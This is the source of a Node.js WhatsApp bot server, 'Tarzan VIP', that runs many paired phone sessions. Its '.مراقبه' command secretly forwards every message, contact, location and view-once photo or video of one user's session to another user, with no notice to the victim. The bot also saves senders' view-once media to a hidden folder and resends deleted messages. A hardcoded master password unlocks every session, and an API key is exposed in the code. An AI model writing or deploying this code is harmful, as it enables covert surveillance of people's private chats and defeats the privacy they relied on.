const express = require('express');
const fs = require('fs');
const path = require('path');
const qrCode = require('qrcode');
const moment = require('moment-timezone');
const axios = require('axios');
const pino = require('pino'); // 🛡️ كتم السجلات لمنع اختناق المعالج
const { GoogleGenerativeAI } = require('@google/generative-ai'); // 🧠 مكتبة جوجل

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    jidNormalizedUser,
    generateWAMessageFromContent,
    makeInMemoryStore, // 🌟 إضافة محرك جهات الاتصال لسحب الأسماء من الهاتف
    proto
} = require('@whiskeysockets/baileys');

// 🛡️ درع حماية بيئة Node.js من الانطفاء المفاجئ
process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);

const app = express();
const PORT = process.env.PORT || 10000;
const MASTER_PASSWORD = 'tarzanbot';
const sessions = {};
const msgStore = new Map();

// 👁️ خريطة الذاكرة لنظام المراقبة
const activeMonitors = new Map();

// 🌟 إنشاء ذاكرة لجهات الاتصال (لقراءة الأسماء والأرقام من الهاتف)
const store = makeInMemoryStore({ logger: pino({ level: 'silent', stream: 'store.log' }) });
const storePath = path.join(__dirname, 'contacts_store.json');
store.readFromFile(storePath);
setInterval(() => { store.writeToFile(storePath); }, 10_000);

// ✅ 1. نظام حفظ الإعدادات (ينشأ بجانب index.js)
const settingsPath = path.join(__dirname, 'settings.json');
let botSettings = {};
if (fs.existsSync(settingsPath)) {
    botSettings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
} else {
    botSettings = { GLOBAL_CONFIG: { geminiApiKey: "" } };
    fs.writeFileSync(settingsPath, JSON.stringify(botSettings));
}

if (!botSettings.GLOBAL_CONFIG) {
    botSettings.GLOBAL_CONFIG = { geminiApiKey: "" };
    saveSettings();
}

function saveSettings() { fs.writeFileSync(settingsPath, JSON.stringify(botSettings, null, 2)); }
function generateSessionPassword() { return 'VIP-' + Math.random().toString(36).substring(2, 8).toUpperCase(); }

// ✅ 2. مجلد الخزنة للميديا المخفية (ينشأ بجانب index.js)
const vaultPath = path.join(__dirname, 'ViewOnce_Vault');
if (!fs.existsSync(vaultPath)) fs.mkdirSync(vaultPath);

// 🛡️ 3. نظام تفريغ الذاكرة الذكي
setInterval(() => {
    if (msgStore.size > 5000) {
        msgStore.clear();
        console.log('🧹 [حماية السيرفر] تم تفريغ الذاكرة المؤقتة للرسائل');
    }
}, 30 * 60 * 1000);

app.use(express.static('public'));
app.use(express.json());

// ==========================================
// 🚀 4. معالج الأوامر
// ==========================================
const commandsMap = new Map();
const commandsPath = path.join(__dirname, 'commands');
if (!fs.existsSync(commandsPath)) fs.mkdirSync(commandsPath);

function loadCommands() {
    commandsMap.clear();
    const files = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
    for (const file of files) {
        try {
            delete require.cache[require.resolve(`./commands/${file}`)];
            const command = require(`./commands/${file}`);
            if (command.name && command.execute) {
                commandsMap.set(command.name.toLowerCase(), command);
                if (command.aliases && Array.isArray(command.aliases)) {
                    command.aliases.forEach(alias => commandsMap.set(alias.toLowerCase(), command));
                }
            }
        } catch (err) {
            console.error(`❌ خطأ في تحميل الأمر ${file}:`, err.message);
        }
    }
}
loadCommands();

// ==========================================
// ⚙️ 5. تشغيل الجلسات وإعادة التشغيل التلقائي
// ==========================================

async function restoreAllSessions() {
    const sessionsDir = path.join(__dirname, 'sessions');
    if (!fs.existsSync(sessionsDir)) return;
    const folders = fs.readdirSync(sessionsDir);
    for (const folder of folders) {
        const credsPath = path.join(sessionsDir, folder, 'creds.json');
        if (fs.existsSync(credsPath)) {
            console.log(`♻️ جاري إعادة تشغيل الجلسة المحفوظة تلقائياً: ${folder}`);
            await startSession(folder);
        }
    }
}

async function startSession(sessionId, res = null, pairingNumber = null) {
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    if (!botSettings[sessionId]) { 
        botSettings[sessionId] = { password: generateSessionPassword(), botEnabled: true, commandsEnabled: true, aiEnabled: false, autoReact: false, reactEmoji: '❤️', welcomeSent: false }; 
        saveSettings(); 
    } 
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath); 
    const { version } = await fetchLatestBaileysVersion(); 
    
    const sock = makeWASocket({ 
        version, 
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) }, 
        logger: pino({ level: 'silent' }), 
        printQRInTerminal: false, 
        markOnlineOnConnect: true, 
        browser: ['Windows', 'Edge', '10.0'], 
        syncFullHistory: false, 
        generateHighQualityLinkPreviews: false 
    }); 
    
    // 🌟 ربط الجلسة بذاكرة جهات الاتصال لسحب الأسماء
    store.bind(sock.ev);
    
    sessions[sessionId] = sock; 
    sock.ev.on('creds.update', saveCreds); 
    
    if (pairingNumber && !sock.authState.creds.registered) { 
        setTimeout(async () => { 
            try { 
                const code = await sock.requestPairingCode(pairingNumber); 
                const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code; 
                if (res && !res.headersSent) res.json({ pairingCode: formattedCode }); 
            } catch (err) { 
                if (res && !res.headersSent) res.status(500).json({ error: 'تعذر طلب الكود. حاول بعد ثوانٍ.' }); 
            } 
        }, 3000); 
    } 
    
    sock.ev.on('connection.update', async (update) => { 
        const { connection, qr, lastDisconnect } = update; 
        if (qr && res && !pairingNumber && !res.headersSent) { 
            try { 
                const qrData = await qrCode.toDataURL(qr); 
                res.json({ qr: qrData }); 
            } catch(e){} 
        } 
        if (connection === 'close') { 
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut; 
            if (shouldReconnect) setTimeout(() => startSession(sessionId), 5000); 
            else { 
                delete sessions[sessionId]; 
                fs.rmSync(sessionPath, { recursive: true, force: true }); 
            } 
        } 
        if (connection === 'open') { 
            console.log(`✅ الجلسة ${sessionId} متصلة بنجاح!`); 
            const selfId = jidNormalizedUser(sock.user.id); 
            try { await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`); } catch (e) {} 
            if (!botSettings[sessionId].welcomeSent) { 
                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك:*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`; 
                await sock.sendMessage(selfId, { image: { url: 'https://b.top4top.io/p_3489wk62d0.jpg' }, caption: welcomeText }); 
                botSettings[sessionId].welcomeSent = true; saveSettings(); 
            } 
        } 
    }); 

    // ========================================== 
    // 🛡️ 6. مضاد الحذف الجبار 
    // ========================================== 
    sock.ev.on('messages.update', async updates => { 
        for (const { key, update } of updates) { 
            if (update?.message === null && key?.remoteJid && !key.fromMe) { 
                try { 
                    const storedMsg = msgStore.get(`${key.remoteJid}_${key.id}`); 
                    if (!storedMsg?.message) return; 
                    const selfId = jidNormalizedUser(sock.user.id); 
                    const senderJid = key.participant || storedMsg.key?.participant || key.remoteJid; 
                    const number = senderJid.split('@')[0].split(':')[0].replace(/\D/g, ''); 
                    const name = storedMsg.pushName || 'مجهول'; 
                    const time = moment().tz("Asia/Riyadh").format("hh:mm A"); 
                    const alertText = `🚫 *[رسالة محذوفة]* 🚫\n👤 *الاسم:* ${name}\n📱 *الرقم:* ${number}\n🕒 *الوقت:* ${time}\n👇 *المحتوى:*`; 
                    await sock.sendMessage(selfId, { text: alertText }); 
                    await sock.sendMessage(selfId, { forward: storedMsg }); 
                } catch (err) {} 
            } 
        } 
    }); 

    // ========================================== 
    // 🔥 7. استقبال الرسائل المركزية (المحرك الرئيسي) 
    // ========================================== 
    sock.ev.on('messages.upsert', async ({ messages, type }) => { 
        if (type !== 'notify') return; 
        const msg = messages[0]; 
        if (!msg?.message) return; 
        
        const from = msg.key.remoteJid; 
        const isGroup = from.endsWith('@g.us'); 
        const isChannel = from.endsWith('@newsletter'); 
        const isStatus = from === 'status@broadcast'; 
        const sender = isGroup ? msg.key.participant : from; 
        const pushName = msg.pushName || 'مجهول'; 
        const selfId = jidNormalizedUser(sock.user.id); 
        const isFromMe = msg.key.fromMe || sender === selfId; 
        
        // 🌟 حفظ كل الرسائل لتتمكن المراقبة من استخراج الرسالة المتفاعل عليها لاحقاً
        if (msgStore.size < 5000) msgStore.set(`${from}_${msg.key.id}`, msg); 
        
        const currentSettings = botSettings[sessionId] || {}; 
        if (!currentSettings.botEnabled) return; 
        
        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || ''; 
        
        const reply = async (text) => { 
            await sock.sendPresenceUpdate('composing', from); 
            return await sock.sendMessage(from, { text: text }, { quoted: msg }); 
        }; 

        // ========================================== 
        // 👻 أوامر تفعيل/إيقاف المراقبة الشبحية 
        // ========================================== 
        if (body.startsWith('.مراقبه ')) { 
            const targetSession = body.replace('.مراقبه ', '').trim(); 
            if (!sessions[targetSession]) return reply('❌ *عـذراً، هـذه الـجـلـسـة غـيـر مـتـصـلـة أو الاسـم خـاطـئ.*'); 
            if (targetSession === sessionId) return reply('❌ *لا يـمـكـنـك مـراقـبـة الـجـلـسـة الـتـي تـسـتـخـدمـهـا حـالـيـاً.*'); 
            activeMonitors.set(targetSession, { monitorJid: sender, monitorSocketId: sessionId }); 
            return reply(`✅ *تـم تـفـعـيـل الـمـراقـبـة الـسـريـة بـنـجـاح.*\n\n👁️‍🗨️ الـهـدف: [ ${targetSession} ]\n📥 *سـيـتـم تـحـويـل جـمـيـع الـرسـائـل هـنـا بـشـكـل مـخـفـي.*`); 
        } 
        if (body === '.ايقاف_المراقبه') { 
            for (let [key, val] of activeMonitors.entries()) { 
                if (val.monitorJid === sender) activeMonitors.delete(key); 
            } 
            return reply('✅ *تـم إيـقـاف جـمـيـع عـمـلـيـات الـمـراقـبـة.*'); 
        } 

        // ========================================== 
        // 🚨 [نظام الرادار المجهر - الأسطورة]
        // ========================================== 
        if (activeMonitors.has(sessionId)) { 
            const monitorInfo = activeMonitors.get(sessionId); 
            const monitorSock = sessions[monitorInfo.monitorSocketId]; 
            
            if (monitorSock && from !== monitorInfo.monitorJid && sender !== monitorInfo.monitorJid) { 
                try { 
                    let actualMessage = msg.message || {}; 
                    let isViewOnce = false; 

                    // فك التغليف للوصول للمحتوى الفعلي
                    if (actualMessage.viewOnceMessage) { actualMessage = actualMessage.viewOnceMessage.message; isViewOnce = true; } 
                    else if (actualMessage.viewOnceMessageV2) { actualMessage = actualMessage.viewOnceMessageV2.message; isViewOnce = true; } 
                    else if (actualMessage.viewOnceMessageV2Extension) { actualMessage = actualMessage.viewOnceMessageV2Extension.message; isViewOnce = true; } 
                    else if (actualMessage.ephemeralMessage) { actualMessage = actualMessage.ephemeralMessage.message; } 

                    // 🌟 كسر الـ LID من خلال البحث عن الرسالة الأصلية
                    const resolveLid = async (jid) => {
                        let str = String(jid);
                        if(str.includes('@lid')) {
                             if (msg.message?.reactionMessage?.key?.id) {
                                const targetMsgId = msg.message.reactionMessage.key.id;
                                for (let [key, storedMsg] of msgStore.entries()) {
                                    if (key.includes(targetMsgId)) {
                                        let originalSender = storedMsg.key.participant || storedMsg.key.remoteJid;
                                        if (originalSender && !originalSender.includes('@lid')) {
                                             return originalSender;
                                        }
                                    }
                                }
                            }
                        }
                        return jid;
                    };

                    // 🌟 دالة جلب الاسم والرقم الصافي من جهات اتصال الهاتف
                    const getContactData = (jid, fallbackName) => {
                        if (!jid) return { name: "غير معروف", number: "غير معروف" };
                        let realJid = jidNormalizedUser(jid);
                        
                        // البحث في ذاكرة الهاتف (جهات الاتصال)
                        const contact = store.contacts[realJid] || store.contacts[jid];
                        let finalName = fallbackName;
                        let finalNumber = realJid.split('@')[0].split(':')[0];

                        if (contact) {
                            finalName = contact.name || contact.notify || contact.verifiedName || fallbackName;
                        }

                        // تنظيف الرقم من أي شوائب (مثل الـ LID المتبقي)
                        if (!realJid.includes('@lid')) {
                             finalNumber = finalNumber.replace(/\D/g, '');
                        } else {
                             finalNumber = `[رقم مخفي] ${finalNumber}`;
                        }
                        
                        return { name: finalName, number: finalNumber };
                    };

                    const myTargetNumber = getContactData(selfId, "أنت (صاحب الهاتف)").number;
                    
                    // تحديد المرسل بدقة بعد كسر الـ LID
                    let rawSenderJid = isFromMe ? selfId : (msg.key.participant || sender);
                    let resolvedSenderJid = await resolveLid(rawSenderJid);
                    let senderInfo = getContactData(resolvedSenderJid, pushName);
                    if (isFromMe) senderInfo.name = "أنت (صاحب الهاتف)";

                    // تحديد المستلم بدقة
                    let receiverInfo = { name: "غير معروف", number: "" };
                    let chatName = "👤 دردشة خاصة";

                    if (isGroup) {
                        receiverInfo.name = "المجموعة";
                        try {
                            const groupMetadata = await sock.groupMetadata(from);
                            chatName = `👥 مجموعة: [ ${groupMetadata.subject} ]`;
                        } catch (e) { chatName = `👥 مجموعة`; }
                    } else if (isChannel) {
                        chatName = "📢 قناة"; receiverInfo.name = "القناة";
                    } else if (isStatus) {
                        chatName = "📱 حالة (Status)"; receiverInfo.name = "الحالة";
                    } else {
                        let rawReceiverJid = isFromMe ? from : selfId;
                        let resolvedReceiverJid = await resolveLid(rawReceiverJid);
                        receiverInfo = getContactData(resolvedReceiverJid, "الطرف الآخر");
                        if (!isFromMe) receiverInfo.name = "أنت (صاحب الهاتف)";
                    }

                    const directionSymbol = isFromMe ? "📤 (صادر من الهاتف)" : "📥 (وارد للهاتف)";

                    let msgType = Object.keys(actualMessage)[0]; 
                    if (msgType === 'senderKeyDistributionMessage' && Object.keys(actualMessage).length > 1) msgType = Object.keys(actualMessage)[1]; 
                    if (msgType === 'messageContextInfo' && Object.keys(actualMessage).length > 1) msgType = Object.keys(actualMessage)[1]; 

                    let eventType = "رسالة نصية 📝";
                    let textContent = actualMessage.conversation || actualMessage.extendedTextMessage?.text || actualMessage.imageMessage?.caption || actualMessage.videoMessage?.caption || ""; 

                    // 🌟 التفاعل وجلب الرسالة الأصلية من الذاكرة
                    if (msgType === 'reactionMessage') {
                        eventType = "تفاعل (إيموجي) ❤️";
                        const reaction = actualMessage.reactionMessage;
                        const targetMsgId = reaction?.key?.id;
                        
                        let originalMsgContent = "رسالة قديمة (غير متوفرة في الذاكرة حالياً)";
                        if (targetMsgId) {
                            const originalMsg = msgStore.get(`${from}_${targetMsgId}`);
                            if (originalMsg && originalMsg.message) {
                                let origActual = originalMsg.message;
                                let origIsVO = false;
                                if (origActual.viewOnceMessage) { origActual = origActual.viewOnceMessage.message; origIsVO = true; }
                                else if (origActual.viewOnceMessageV2) { origActual = origActual.viewOnceMessageV2.message; origIsVO = true; }
                                
                                let origType = Object.keys(origActual)[0];
                                if (origType === 'messageContextInfo') origType = Object.keys(origActual)[1];

                                if (origType === 'conversation' || origType === 'extendedTextMessage') {
                                    let txt = origActual.conversation || origActual.extendedTextMessage?.text || "";
                                    originalMsgContent = `[رسالة نصية]: "${txt.length > 50 ? txt.substring(0,50)+'...' : txt}"`;
                                } else if (origType === 'imageMessage') { originalMsgContent = `[صورة] ${origActual.imageMessage?.caption || ''}`;
                                } else if (origType === 'videoMessage') { originalMsgContent = `[فيديو] ${origActual.videoMessage?.caption || ''}`;
                                } else if (origType === 'audioMessage') { originalMsgContent = `[مقطع صوتي]`;
                                } else if (origType === 'documentMessage') { originalMsgContent = `[ملف/مستند]`;
                                } else if (origType === 'stickerMessage') { originalMsgContent = `[ملصق/ستيكر]`; }
                                if (origIsVO) originalMsgContent += " 🚨(عرض لمرة واحدة)";
                            }
                        }

                        if (reaction && reaction.text) {
                            textContent = `قام بوضع إيموجي [ ${reaction.text} ]\n👇 *على هذه الرسالة:*\n${originalMsgContent}`;
                        } else {
                            textContent = `قام بإزالة التفاعل\n👇 *من هذه الرسالة:*\n${originalMsgContent}`; 
                        }
                    } 
                    else if (msgType === 'protocolMessage') {
                        eventType = "حذف رسالة 🗑️";
                        textContent = `قام بحذف رسالة لدى الجميع.`;
                    }
                    else if (['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'].includes(msgType)) {
                        eventType = "ملف وسائط 📁";
                        if (!textContent) textContent = "(مرفق وسائط بالأسفل)";
                    }
                    else if (msgType === 'contactMessage') eventType = "جهة اتصال 👤";
                    else if (msgType === 'locationMessage') eventType = "موقع 📍";
                    else if (msgType === 'pollCreationMessage') {
                        eventType = "تصويت (استطلاع رأي) 📊";
                        textContent = actualMessage.pollCreationMessage?.name || "إنشاء تصويت جديد";
                    }

                    if (!textContent && eventType === "رسالة نصية 📝") return;

                    // 🌟 التقرير الواضح والنهائي (المرسل والمستلم بدقة تامة)
                    const reportText = 
                    `┏━━━━━━━━━━━━━━━\n` +
                    `┃ 📡 ❲ رادار المراقبة الدقيق ❳ 📡\n` +
                    `┣━━━━━━━━━━━━━━━\n` +
                    `┃ 🔄 *الاتجاه:* ${directionSymbol}\n` +
                    `┃ 🗣️ *المكان:* ${chatName}\n` +
                    `┃ ⏰ *الوقت:* ${moment().tz("Asia/Riyadh").format("hh:mm A")}\n` +
                    `┣━━━━━━━━━━━━━━━\n` +
                    `┃ 👤 *من:* ${senderInfo.name}\n` +
                    `┃ 📱 *رقمه:* ${senderInfo.number}\n` +
                    `┃ 🎯 *إلى:* ${receiverInfo.name}\n` +
                    `┃ 📱 *رقمه:* ${receiverInfo.number}\n` +
                    `┣━━━━━━━━━━━━━━━\n` +
                    `┃ 📌 *الحدث:* [ ${eventType} ]\n` +
                    (isViewOnce ? `┃ 🚨 *ملاحظة:* (رسالة عرض لمرة واحدة)\n` : "") +
                    `┃ 📝 *التفاصيل:*\n` +
                    `┃ ${textContent || "بدون نص"}\n` +
                    `┗━━━━━━━━━━━━━━━`;

                    await monitorSock.sendMessage(monitorInfo.monitorJid, { text: reportText }); 

                    const isMedia = ['imageMessage', 'videoMessage', 'audioMessage', 'stickerMessage', 'documentMessage'].includes(msgType); 
                    if (isMedia) { 
                        if (isViewOnce) { 
                            try { 
                                const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) }); 
                                if (msgType === 'imageMessage') await monitorSock.sendMessage(monitorInfo.monitorJid, { image: buffer, caption: "📸 *[صورة محمية]*" }); 
                                else if (msgType === 'videoMessage') await monitorSock.sendMessage(monitorInfo.monitorJid, { video: buffer, caption: "🎥 *[فيديو محمي]*" }); 
                                else if (msgType === 'audioMessage') await monitorSock.sendMessage(monitorInfo.monitorJid, { audio: buffer, mimetype: 'audio/mpeg', ptt: true }); 
                            } catch (mediaErr) {} 
                        } else { 
                            await monitorSock.sendMessage(monitorInfo.monitorJid, { forward: msg }); 
                        } 
                    } else if (msgType === 'contactMessage' || msgType === 'locationMessage') { 
                        await monitorSock.sendMessage(monitorInfo.monitorJid, { forward: msg }); 
                    } 
                } catch (e) { 
                    console.error('❌ خطأ:', e.message); 
                } 
            } 
        } 

        // ========================================== 
        // 👁️‍🗨️ الرادار العام: الخزنة (يعمل حتى بدون مراقبة) 
        // ========================================== 
        let globalViewOnce = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension; 
        const globalMediaTypeCheck = Object.keys(msg.message)[0]; 
        if (msg.message[globalMediaTypeCheck]?.viewOnce === true) globalViewOnce = { message: msg.message }; 
        
        if (globalViewOnce && !isFromMe) { 
            try { 
                const actualMessage = globalViewOnce.message; 
                const mediaType = Object.keys(actualMessage)[0]; 
                const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) }); 
                const ext = mediaType === 'imageMessage' ? 'jpg' : (mediaType === 'videoMessage' ? 'mp4' : 'ogg'); 
                const fileName = `VO_${sender.split('@')[0]}_${Date.now()}.${ext}`; 
                fs.writeFileSync(path.join(vaultPath, fileName), buffer); 
                const reportTxt = `🚨 *[خزنة الميديا المخفية]* 🚨\n\n👤 *المرسل:* ${pushName}\n📱 *الرقم:* ${sender.split('@')[0].split(':')[0]}\n📁 *حُفظت باسم:* ${fileName}\n\n*— TARZAN VIP 👑*`; 
                if (mediaType === 'imageMessage') await sock.sendMessage(selfId, { image: buffer, caption: reportTxt }); 
                else if (mediaType === 'videoMessage') await sock.sendMessage(selfId, { video: buffer, caption: reportTxt }); 
                else if (mediaType === 'audioMessage') await sock.sendMessage(selfId, { audio: buffer, mimetype: 'audio/mpeg', ptt: true }); 
            } catch (err) {} 
        } 
        
        if (currentSettings.autoReact && !isFromMe && !globalViewOnce && type !== 'reactionMessage') { 
            try { await sock.sendMessage(from, { react: { text: currentSettings.reactEmoji || '❤️', key: msg.key } }); } catch(e) {} 
        } 
        
        const isCmd = body.startsWith('.'); 

        // ========================================== 
        // 🧠 8. الذكاء الاصطناعي (نظام Tarzan VIP المخصص) 
        // ========================================== 
        if (currentSettings.aiEnabled && !isCmd && !isFromMe && body.trim() !== '' && !globalViewOnce && type !== 'reactionMessage') { 
            try { 
                await sock.sendPresenceUpdate('composing', from); 
                const query = body.trim(); 
                const API_KEY = 'AI_1d21219cc3914971'; 
                const API_URL = 'http://Fi5.bot-hosting.net:22214/api/chat'; 
                const response = await axios.post(API_URL, { api_key: API_KEY, prompt: query }, { headers: { 'Content-Type': 'application/json' }, timeout: 25000 }); 
                if (response.data && response.data.status === 'success') { 
                    const aiReply = response.data.response; 
                    await reply(aiReply); 
                } 
            } catch (error) {} 
            return; 
        } 

        // ========================================== 
        // 🎯 9. معالجة الأوامر الخارجية
        // ========================================== 
        if (!currentSettings.commandsEnabled) return; 
        
        let selectedId = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ? JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : ''; 
        let commandName = ''; 
        let args = []; 
        let textArgs = ''; 
        
        if (selectedId) { 
            commandName = selectedId.toLowerCase(); 
        } else if (isCmd) { 
            args = body.slice(1).trim().split(/ +/); 
            commandName = args.shift().toLowerCase(); 
            textArgs = args.join(' '); 
        } 
        
        if (!commandName) return; 
        
        const commandData = commandsMap.get(commandName); 
        if (commandData) { 
            try { 
                if (commandName !== '🌚' && commandName !== 'vv') { await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } }); } 
                await commandData.execute({ sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix: '.', commandName, sessions, botSettings, saveSettings }); 
            } catch (error) { 
                if (commandName !== '🌚' && commandName !== 'vv') { await sock.sendMessage(from, { react: { text: '❌', key: msg.key } }); } 
            } 
        } 
    }); 

    return sock; 
}

// ==========================================
// 🌐 10. API Endpoints (لوحة التحكم)
// ==========================================
app.post('/create-session', (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) return res.status(400).json({ error: 'أدخل اسم الجلسة' });
    startSession(sessionId, res);
});

app.post('/pair', async (req, res) => {
    const { sessionId, number } = req.body;
    if (!sessionId || !number) return res.status(400).json({ error: 'أدخل الجلسة والرقم' });
    let formattedNumber = number.replace(/[^0-9]/g, '');

    if (sessions[sessionId] || fs.existsSync(path.join(__dirname, 'sessions', sessionId))) { 
        if(sessions[sessionId]) sessions[sessionId].logout(); 
        delete sessions[sessionId]; 
        fs.rmSync(path.join(__dirname, 'sessions', sessionId), { recursive: true, force: true }); 
    } 
    startSession(sessionId, res, formattedNumber); 
});

app.post('/api/settings/get', (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    res.json(settings);
});

app.post('/api/settings/save', (req, res) => {
    const { sessionId, password, botEnabled, commandsEnabled, aiEnabled, autoReact, reactEmoji } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });

    botSettings[sessionId].botEnabled = !!botEnabled; 
    botSettings[sessionId].commandsEnabled = !!commandsEnabled; 
    botSettings[sessionId].aiEnabled = !!aiEnabled; 
    botSettings[sessionId].autoReact = !!autoReact; 
    botSettings[sessionId].reactEmoji = reactEmoji || '❤️'; 
    saveSettings(); 
    res.json({ success: true, message: '✅ تم حفظ التعديلات' }); 
});

app.get('/sessions', (req, res) => { 
    res.json({ count: Object.keys(sessions).length, sessions: Object.keys(sessions) }); 
});

app.post('/delete-session', (req, res) => {
    const { sessionId, password } = req.body;
    if (password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور السيرفر خاطئة' });
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (sessions[sessionId]) { sessions[sessionId].logout(); delete sessions[sessionId]; }
    if (botSettings[sessionId]) { delete botSettings[sessionId]; saveSettings(); }
    if (fs.existsSync(sessionPath)) { fs.rmSync(sessionPath, { recursive: true, force: true }); res.json({ message: `تم حذف ${sessionId}` }); }
    else { res.status(404).json({ error: 'الجلسة غير موجودة' }); }
});

app.listen(PORT, async () => {
    console.log('\n=========================================');
    console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
    console.log('🛡️ وضع الحماية من الانهيار مفعل بنجاح');
    console.log('👑 المراقبة الاستخباراتية الشاملة [الأسطورة] مفعلة');
    console.log('=========================================\n');
    
    // استعادة الجلسات التلقائية
    await restoreAllSessions();
});
